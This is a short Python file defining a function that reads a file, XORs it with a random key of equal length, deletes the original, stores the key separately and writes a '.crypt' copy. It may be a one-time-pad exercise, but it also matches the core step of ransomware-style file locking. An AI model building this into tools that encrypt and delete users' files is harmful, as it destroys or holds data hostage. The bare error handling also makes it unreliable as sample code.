import os



def encrypt(filename, path):
    try:
        to_encrypt = open(filename, "rb").read()
        size = len(to_encrypt)
        key = os.urandom(size)
        os.remove(filename)
        filename_temp = filename.split('\\')[1] + '.key'
        filename = filename + '.crypt'
        with open(f'{path}\\{filename_temp}', 'wb') as key_out:
            key_out.write(key)
            encrypted = bytes(a ^ b for(a, b) in zip(to_encrypt, key))
        with open(filename, 'wb') as encrypted_out:
                encrypted_out.write(encrypted)
    except:
        print('Something went wrong')


